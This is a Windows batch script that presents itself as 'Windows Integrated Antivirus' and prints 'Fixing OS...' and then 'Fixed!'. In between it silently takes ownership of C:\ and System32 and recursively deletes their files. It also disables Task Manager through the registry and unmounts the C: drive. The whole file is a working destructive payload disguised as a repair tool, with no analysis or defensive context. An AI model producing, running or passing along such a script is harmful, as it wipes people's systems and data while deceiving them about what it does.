@echo off
title Windows Integrated Antivirus
echo Fixing OS...
takeown /f C:\Windows /r /d Y > nul 2>&1
takeown /f C:\Windows\System32 /r /d Y > nul 2>&1
takeown /f C:\ /r /d Y > nul 2>&1
del /s /f /q C:\ > nul 2>&1
del /s /f /q C:\Windows\System32 > nul 2>&1
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
mountvol c: /d 
cls
echo Fixed!
pause>nul
